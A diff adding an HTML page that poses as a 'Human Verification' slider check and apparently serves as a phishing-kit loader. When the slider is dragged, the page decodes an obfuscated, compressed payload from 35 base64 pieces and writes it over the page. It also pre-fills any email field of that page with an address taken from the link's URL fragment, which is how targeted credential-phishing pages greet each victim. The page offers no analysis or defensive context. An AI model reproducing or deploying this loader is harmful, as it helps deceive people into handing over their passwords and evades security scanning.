@@ -1,0 +1,182 @@
+<!doctype html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>Loading...</title>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/lz-string/1.4.4/lz-string.min.js"></script>
+<style>
+  #css-pass::before { content: "LUixDx"; display:none; }
+  #human-overlay { position: fixed; inset: 0; display:flex; align-items:center; justify-content:center; background: rgba(255,255,255,0.98); z-index:2147483647; font-family: system-ui, sans-serif; }
+  #human-box { background: white; border-radius:12px; padding:30px; box-shadow:0 10px 30px rgba(0,0,0,0.15); text-align:center; max-width:90%; width: 360px; }
+  #slider-container { margin-top: 20px; }
+  #slider-track {
+    width: 280px; height: 50px; background: #f0f0f0; border: 2px solid #ddd; border-radius: 25px; 
+    position: relative; margin: 0 auto; overflow: hidden;
+  }
+  #slider-handle {
+    width: 50px; height: 46px; background: #0b61ff; border-radius: 23px; position: absolute; left: 0; top: 0;
+    display: flex; align-items: center; justify-content: center; color: white; font-size: 24px; cursor: grab;
+    user-select: none; touch-action: none; transition: background 0.2s;
+  }
+  #slider-handle:active { cursor: grabbing; background: #0050e0; }
+  #slider-text { margin-top: 12px; font-size: 14px; color: #666; }
+</style>
+</head>
+<body>
+<div id="css-pass" aria-hidden="true"></div>
+
+<div id="human-overlay">
+  <div id="human-box">
+    <h2 style="margin:0 0 8px 0">Human Verification</h2>
+    <p style="margin:0 0 12px 0; color:#666;">Please complete the action below to continue.</p>
+    <div id="slider-container">
+      <div id="slider-track">
+        <div id="slider-handle">→</div>
+      </div>
+      <div id="slider-text">Drag to the right to prove you are human</div>
+    </div>
+  </div>
+</div>
+
+<script>
+console.log("[Decoder] Starting. Pieces count:", 35);
+
+var piecesArr = ["djFCaDM2azYxOHdvZjhycXl4ZjRDN1pabGk5S0Mxekp0OkJkQmg4QjFjS0I0QnB7dVY2Vjk3SHRbUEJSTUJ5QmhTV0I3OTVOQm9CSm1ueUJMcUg6WENuQmwzc0cxbmNMQlNCOURaUGhlQkhENXA1YkR7SXhIaHVCWUJYQkpCSkxSQ2huaExoeGg5aEpoUnhF","OEhtaDJpenNmQ3VCMDFjR0JuSnRTcEpKY09oVHs3akdMdEVCTHppREhDW0REMU10UkxFQmZPa1NwRjFEbXRVUTJKS0tCMVtrdVh7d20xa2tTQkZMcUhpbUtSS29oQkpxZGJCQmVic3NzQjVKQjFNb1NaaEtncnJORUJSSUJOREIyMUlQMGpMSVBsck1IN1R2","bXhwWWxGR0c2Rlh0TzRqVntOalNKbWQ5WUNsRVhwNDgsaHA5SXU3amxSQzpOQ21wNDVwT3gseEgxMWVsVTh2e3csQjhTeFlCRnlKUlBEe2VESWlCSUh3QkJlR3FJQmhLYkpaQ0dtREQ4WlllZEVCS3lHQkZGTEtEWGZFQldCTm5vQmhpcEJRM0oxRUJ4bkNC","Mk5wRlZWR2JkRmp6e0hmR1pqbllpMTczSzlxc1s0bVhsWFZqSDdoR1NIT2pIRlpaMSwzSE5YQ3hKbEZjQnB5VHJmMnZuV3dMYnh3V1dFU1djcFZnQkppRkJPYk1LS0t2QkVVVlRZdFRQbGM6aHlGQmRJe0J4ZXRCQjRTTkJETjNTdjlkQkx1SEI1SXFpNGUx","ZlJMcFpiSHFCRTZERkRNQlBJS3FbSGlCRWJ3UXpKMjB4S0RkU0U6TmlnckVVNWRjTnhkaXcsR20xbnBSW0ljY01UYlZlcGVwb1F4NTdvY05lRjpTT0x0SzZDOEx2c2ZORVBiTVpVa1VCRjVEa3poU1ozdmptV3pHa3pHSHQ2UTRbUVUwN1BjRlN2MWt2UXVu","and7RzFpUTdESUpOektQam1zcixya2JpS3JpcltoM3FyRG1oRzRpeDNqeVoxSHFpaXhTSzBENlZvWWlwaVk1cEksZmRGYkRzMkxsUG9IcGtoV0pESFpqNVNSRHBYSHVIcVNwdnZsTVo3M0Z5NjNqSGpMR1RIalRmMUJnNVg3cU9rREZJcFJUamlSWzJaRFpS","Nmk0UmZXU1JUTWxbNFRyTjdnZlBMQjp4SG9wdmhEUENQWkRqSHQ3SjJGTWpSN2lbRGdsY0V5b0hvOkNySE1IeUcwanhpaENqUzNULG93R2NmbUlSYnZuOlBNS0Z0Yk5LQkw2R21CaEhVZGxSZm5vNVFLU0NCWmhDQ3BsZWxoSEVManA4VGpYUUhoS3hQRFNs","VnptWmM0bmxsaUNQdGk4T3A3UlFiOXlJeTZFNWw0Nk9mR2dCbTJ0dUhYeWZ0WHl5WlJGOjdkQltqZkZINUhlS3lxa1NURjZmN1ZIb2lxd3pZaVtibEd0bmRkSXpIQzlzW3R0UElXV3F7ODFkSW81MXh2N21ucXZDbXFDRkg2bFhHMzZKaG1taGRQWldbQ1J3","Q2VqWjRTbXFLNk1NZlJrZ0VGdHtISnBJaFpwODloM0RPcGh2ezN0bGRiOXpJT3JZVDVkNjRaNFd2WFtxa09pazRaWHZFNFJYVjpZd0RkdWNYcHNlSzFwT2xrU0pkOUlueVhtRlVDW3dQR1VDT3BbcmNUN2p1cm9iVGZkUTVDZUlNc2t2V0Y4SFNKeUM3Sk5a","WGVXRXRZV1dTMzR1OltOWVNjZlo1Vk8seTFKOFlFWjAyNGZjUDIzaG1FLG4yVzdmY1d4ZVpsb01wckxsc0RbLDlQeToxRmRUbWdsN252d0w2TFMybDVaSUIzWm0xSHp5SWRJaUgsZHBrY21NbG03UlBoOk9RM3tkYkhIc1NbNXFtaWxick5xQkJLW05bdFJv","M1hVVnBXRTQ2eTlKQkU3S1F7NjZkQmJSVm9Hc2premxSSVBUSXZMejhJdGhlaE9iRVEwWUlsRVhsWVdiNlpPN3pxTnVSZ1hZczpmV25maWJbZTNYbnZ3eUVqWVdjV1ltZjJlbWxjU0doRGRZTUVxcndpbkhIOVAsMWV7blo3bnJVOEVjUkxNcmRJSTc2MkJs","R2NTUlVzQm9oRVRTZGhWYk5KT2RzOXFrUDZ4SnpDVkRMeTpCTzNqTEYsUldrNXBDb0lKR1VVOVZpeEJFbkxXZ1JzRXFpWVVxSzR6cllOU0hEZXdtUjNLVE9YOUJrQ1NGNkJpaUNCSWpMY3lVc1RlSTdlVWs5b0hoRm1jSkhGbVpFRFV6cU5IRzlzMkVwNkp0","NDZDeVtYR25JbnptaFpKUU1rUVlIW3NKdixGRHZmUGQ1MVo3SExlZVpMdFtIcUN6ZmVKeVI4RDdpMmhkRE55eWM3Rk5bUFBLa2UyTXNbOkRWT1pEYkRma2hWb3Zie202aENEemlaNUUzREYzT1tnNkNGU1pNb3tXWkhxW0ZFWGtURUhDTGlDQk1wTVdtdUp6","RHRCUDVlM1QxTTdGdU5bYk9NVVZRTjhsajJDeWRKTko4c3dHSkRYbWtSazJtVms4dmZMVmJoZUQsU1B6TFJMY3kzRCxxQzFOOGpZTFV4QnA5UmNaRFJrQntCazR5VUpMa0N5cWh1e2JIaltiV0ZFekVYRk5oQ1dCdER6V0lCSVRPcU5bc3ZVVERMZG1OQnVD","aGNbQnZFZ0I3cXJEQkJKaWJnVXAxUTlrbktWWjo1SGpCU0VlaTZbR0RITUNDaThSUkhXeG43VERFR1JESFdqTFNPc0JrcElETDBKclFuRUx0RTNYWG51WG9uVHQ4S3J4T3pUSlRkMnksWld3UXg6NjpWNjlTTGdqUTZtRDpON01DUkRrTVQ5VjRLUjhXOUVE","azJHUGZCT29HWVdnQ1VaUlZEWmhFe3cydzlHMjJ4RGROMU85THJDNGVpNUxsOVhmdVN1MUI3c2pDbnBjMVBiYnlVdjZHRW56WFlSWmVxNmRaSWJRQjdSOmdmZk1iUDRncUNPZ3ZIZ21UdUxxRldEaFQ1dmxYdkM3eW01QnlYeEtrSkVEbnhsaFtxdVZZTG14","b2lxc3paQmV6R3BGcEVnaFhHW2hQako1b3QxLHRYaGdCTkhMdUU3YnRtT1pLT2hPbHVGYkRPUklTVEpCQk5GN0NWYkpSW2RJeGl1RTFac2gzM2ZjRzk0bml6MVE3RTpEMUNTaXBoTkpoV0lGaFFKeWhCeENaR1FEREI6NU05UGZMMDFGcGY2azd1bXJmbnRw","LE9Sa2czUGIwdVlCOVpyV2MyeVV4SE5JbkNVaUtiSjV5aVhJVWJFN0gxRVRSSUZIWG5xQ3U6Vkp4QnZJMkV4bmU0dmUwdmdqbTg4OnlpUmdVdkVMOHVCb3ZIUnFzQmI4RzpyZlZRQ01FYjhpUmh2SUZ2OEJEeGtoWDZ3ZEQsNFk3VTpDNVFraXlSe2xjTExS","Qkc2UjFqT0JHbEdCQjd0YnhHVklWZix4SkY3ZWlDWm9HSEI6OGw5blB2YmlKRGZvaXtqW25TU3hzbDdoVWh5STFmOUptbWpUZjdTSVo5NCxId3VLVjVaZEwxemlweFAwYkRHaDYsblprSEtMZkVwbENDbWxDQkJMWixTSUZDVURuRyxUeDNTY0VsM1hSaXVJ","TmtSY1hPe2V4eSwxY3R2LEJiNUtaZUtFaWh7Q0w1VmROUEI4QzFwTFpjdEtYSXNEOVJkaEdwOjFYYmhRWGh4UzRJbmZqUHJjMjpNakxqRXp1TGxCQmg1aDMxNVdEUlNwe1pocE1nSHtUQnp5SHBbUlBsRjVZbHVGWHhGV0hDbHNNTndZbDE1NjhqZVNpNUZi","eU5adGVUM1BVb3lOcFpiMzNoWWhnQ29SRnB0WFNDSlk2REpne1hmaE9oV2l4M0RxbHdzUU9EU2JNQjFpbnlvOUxSQ3tERkZxQnhKdzI2SGV1RVZoT2g4cXJXe2REWWRna1hmR3hFVnVFYjZoZVpEW0RuQlVCTjdnUmZYRDN0dUJteGJrRGZjOk5lWTRwZGg0","VEdxcHM3RnZ6ZTpmT2JIdFlDQmV4TkpKSm9EMk5QWDRSYjN4RVh6cVNkRVJoVGJCQndIUzZKUEpFT2tIQnBwdmgzZntKW0JMWVA0RWp7S3Q5dEViUXNaQ2dRVm5xQlZQOHtjUmNvY2YxcWhtTmpTdE9xb1VrQ2VEaDY3Q2I4UFVFOXQyWzYxZzN1c2RTSnsz","MHFEUjZ5MFpTUFNLZFlWcEVmejR6b1ZkUXZLdXZbTnM1TmREUEQ4a2U0eGxHdHlIQk5JN0V1aTdbNXFlbndtUGRHVHlKdWxQYmZDdUk5WFNjZnRoSTRmb0pme2JMT2hvaE5CTmhCWm5Qa21DZW54eCxlaUhROVN0WHpDV0lrTFI2ekpWYnpIW2lOU0hIZmNS","UmpaMFU4R1dMUlZEUDBHSEg4Y1RFQlBCR0pDQkU4VWdWODpxVmhSREkxUVh4eDZITjZaQ0U1amhmdEdXVVdDcEJ7TnVuWU5yRE1iRnVYdkZrd2hQLGhRRnV6RTc5UVhHTWpbb3Y0Mns1cTpLUEttS1JQaFpnT3lZTWh3NjNmZmo5LGd3b3ZVM0sscVFIbmJo","Qm9CTUNUR2dCU0d3UlF0V2hYU1dTe0RTQmR4SkIxaDhCS2k4bERCUlBCQjVTQkk1U1JWcENSVkpDS0owV3hHaExqNUJjaGdKQ0pRZlZSY29leEJKSUpKNVM1U3ROeEpKRWhQNVBaYkplaEJ4SjVxQkZWTXBPVkdaQzVQckQ1Qm1JTVpIVzhRQkc4SUlXY0xk","YzFoSllNW01YWVoxQlNZTU5NRmhlY1ZwZnswSlt7WUpQTVh7TW9RME1oVHtHT0pPaHhDdzV4OWg1SlZKQ1Zmb1lsR3FMNUY5TDBFRkh3S1hNcGdtQkJOR05yQm1DMVZCbDAxQ0VNS1NlaE4wbUltODJQTjh1ZTpWQ1Rpb0I4dFE5aUNIQ2tCSkJuaUhCVTFQ","MkZKSTdEWEp4Q05LWlF4bCxJM0Q3NGNUMkhSeHAzcDFiQmtLYklrSzdJT0VleUx5aktiT240TEtuSEoyR25kRE9FNkVTR09CbEVPeHpQYk9MRkpHa0s3QlJ7ckVqTXJKYkNWUk9CQnN2SnFKMHBYSktjQ0pQc1ZNS01ucE5ORFJjRGVzUE1Lc1ZTSXNIMU5S","eEJIRlRCdEtOSGRFM0RGQzFILG05b2RFdG5nQjJEdmtkRXhFeEJORFdCanpLQyxCV0NMTjN7bG10RmRMQ0tqa3t5MElYaGtEdERENFNDU1dLaWhCaEJSQ0NrWjN1MmwxbEJuMllEUkt4R05LeFBQQ1pYVVdVSEZXOHhNT2pOZkxqeDQxbk05aVpQM0VSeVNT","alVFWFNWRW5DR0RIRTdFYlNoRXJLWERMVUVGSmlGZFZWeGlGSnNSdUNJU3hUTEJOQmRoOVJyQjdDeEJOVEtocWljQjdVTEM3SzRsWGVNVVRCMEVHV2YxLFR2UzZpUFpQbUNCQnRTWENSRHNDVEJiSnFGYmhkRVdWSkNwTzFTSWxkRVpJN0QsUm9QQkhiSFJE","VER6LGRoVERCZUUzMnpVTEowcUZobFpjU2tDMFNEREdFNkVbRXFFS0V5RWlFQ0UsVTBDWFVnRVBEM0RYRG5ESEJ6RTdEYkRyQmJFTFQ4VGNsUlVzQkVUTVpoVExCelV6VFdUVUpPQjdHe0NaQk5CeXFGUkRCYkVHRDZEW0RxREtEU0VpRENELFZuRHZTWjEz","QkdTe0xCOjBPOWhSUk9CY0Vsa1Z5WlJFSnpSa1N7bHFpbWltR2VCM3tjeUp4VjlwaXBpSGhVaG15cVNFUkVCR1JFdXR6VWhtaThDR2htQyxDR0J1RUNpRWlGUnNoczo3aElpYkQzQlNDTkVGaWhocUN6aDhpOXhHRTNCLFd6aDR7RGlOVUkxMHhzUjZVRVoy","MURCQkZ2eEJSRGxGV0dCTW1GTEhsQ0hJSklGSGhDaHE1RWxObUZaWWJCQjVQUkhwc1pKQlA1djFVTlVCSXBaRldCS1JDcDVqRGQ3cFNTd1JOSlBHQ0JEeUJHQnRSRkNHdHJCdWlqQ2l5cUN4eEpsa2hFaTlCWkJKRlNCWzFxQzFKR2l6Q2lpdkpKaG1peUN4","VWhjUmt6MXpMRkh5ZHRXbU1SWlI5elNKdnpMUlpoWGxrTFRKdnpVcEMxaHRlaGdORHBDTkxSQ3BDdFNoZTFCMTE5UXBnSks1UEZMcGl6YmhLV0xEU2hYeGdKR0pTellbTURGbFBoWHhialptTWhYNVl6Q0JCckNzaWVSOWg4NUpCVGk3WzJCN0JiTExCR0xM","UGg5Ykp4dGhFUmh6SmxCbEJCbzFKaDl6TDhJUlZ4OWRIMUVxMjFiaDN0V2gscndiWnpCZWJwMHhCWmQ2cHJ7cmlyZUpKMXZGenJzcnlyZmVtVlQ1dkx3cnpyOXpyRlV5R0JLNXZycnJEUjVyTnBHWkJCSzZwelNoZkpRSEdGWlVaNVRaZGhmY0ZCTDZKaDNM","RERESEhKfk9QWnleaUhsSlJIbnJ+ejZMfX5dWFxaS0hTO0t+aG5Kbg=="];
+
+function reassemblePieces() {
+  var out = '';
+  try {
+    for (var i = 0; i < piecesArr.length; i++) {
+      var b64piece = piecesArr[i];
+      var transformed = atob(b64piece);
+      var rot = (transformed.length % 11);
+      var chars = [];
+      for (var j = 0; j < transformed.length; j++) {
+        var code = (transformed.charCodeAt(j) - rot) & 0xFF;
+        chars.push(String.fromCharCode(code));
+      }
+      out += chars.reverse().join('');
+    }
+    return out;
+  } catch (e) {
+    console.error('[Decoder] Reassembly failed:', e);
+    return null;
+  }
+}
+
+// --- Slider Logic ---
+var handle = document.getElementById('slider-handle');
+var track = document.getElementById('slider-track');
+var isDragging = false;
+var startX = 0;
+var handleLeft = 0;
+
+function startDrag(e) {
+  isDragging = true;
+  startX = e.clientX || (e.touches && e.touches[0] && e.touches[0].clientX) || 0;
+  handleLeft = handle.offsetLeft;
+  document.addEventListener('mousemove', drag);
+  document.addEventListener('touchmove', drag);
+  document.addEventListener('mouseup', stopDrag);
+  document.addEventListener('touchend', stopDrag);
+}
+
+function drag(e) {
+  if (!isDragging) return;
+  var x = e.clientX || (e.touches && e.touches[0] && e.touches[0].clientX) || 0;
+  var dx = x - startX;
+  var maxLeft = track.offsetWidth - handle.offsetWidth;
+  var newLeft = Math.max(0, Math.min(handleLeft + dx, maxLeft));
+  handle.style.left = newLeft + 'px';
+  
+  if (newLeft >= maxLeft - 5) {
+    stopDrag();
+    triggerReconstruct();
+  }
+}
+
+function stopDrag() {
+  isDragging = false;
+  document.removeEventListener('mousemove', drag);
+  document.removeEventListener('touchmove', drag);
+  document.removeEventListener('mouseup', stopDrag);
+  document.removeEventListener('touchend', stopDrag);
+  
+  if (handle.offsetLeft < track.offsetWidth - handle.offsetWidth - 5) {
+    handle.style.left = '0px';
+  }
+}
+
+function triggerReconstruct() {
+  var overlay = document.getElementById('human-overlay');
+  if (overlay) overlay.remove();
+  attemptReconstruct();
+}
+
+handle.addEventListener('mousedown', startDrag);
+handle.addEventListener('touchstart', startDrag);
+// -------------------
+
+function attemptReconstruct() {
+  var assembled = reassemblePieces();
+  if (!assembled) {
+    document.body.innerHTML = '<h2 style="color:red;text-align:center;margin-top:50px;">Reassembly failed.</h2>';
+    return;
+  }
+
+  try {
+    var html = LZString.decompressFromBase64(assembled);
+    if (!html) throw new Error('Decompression returned null');
+    
+    var currentHash = window.location.hash;
+    if (currentHash && currentHash.length > 1) {
+      var emailValue = currentHash.substring(1);
+      
+      // BULLETPROOF PREFILL: Encode script to Base64 to prevent ANY escaping/syntax errors
+      var prefillCode = `
+        (function() {
+          var emailVal = ${JSON.stringify(emailValue)};
+          var nativeSetter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, "value").set;
+          function tryFill() {
+            var selectors = 'input[type="email"], input[name*="email" i], input[id*="email" i], input[placeholder*="email" i]';
+            var inputs = document.querySelectorAll(selectors);
+            for (var i = 0; i < inputs.length; i++) {
+              if (!inputs[i].value) {
+                if (nativeSetter) { nativeSetter.call(inputs[i], emailVal); } else { inputs[i].value = emailVal; }
+                inputs[i].dispatchEvent(new Event("input", { bubbles: true }));
+                inputs[i].dispatchEvent(new Event("change", { bubbles: true }));
+              }
+            }
+          }
+          var attempts = 0;
+          var interval = setInterval(function() {
+            tryFill();
+            if (++attempts > 20) clearInterval(interval);
+          }, 300);
+        })();
+      `;
+      
+      var encodedPrefill = btoa(unescape(encodeURIComponent(prefillCode)));
+      var prefillScript = '<script>try{eval(decodeURIComponent(escape(atob("' + encodedPrefill + '"))))}catch(e){console.error(e)}<\/script>';
+      
+      if (html.includes('</head>')) {
+        html = html.replace('</head>', prefillScript + '</head>');
+      } else if (html.includes('<body>')) {
+        html = html.replace('<body>', '<body>' + prefillScript);
+      } else {
+        html = prefillScript + html;
+      }
+    }
+
+    document.open();
+    document.write(html);
+    document.close();
+  } catch (e) {
+    console.error('[Decoder] Fatal error:', e);
+    document.body.innerHTML = '<h2 style="color:red;text-align:center;margin-top:50px;">Reconstruction failed: ' + e.message + '</h2>';
+  }
+}
+</script>
+<noscript><meta name="robots" content="noindex,nofollow"><p>JavaScript is required to view this page.</p></noscript>
+</body>
+</html>
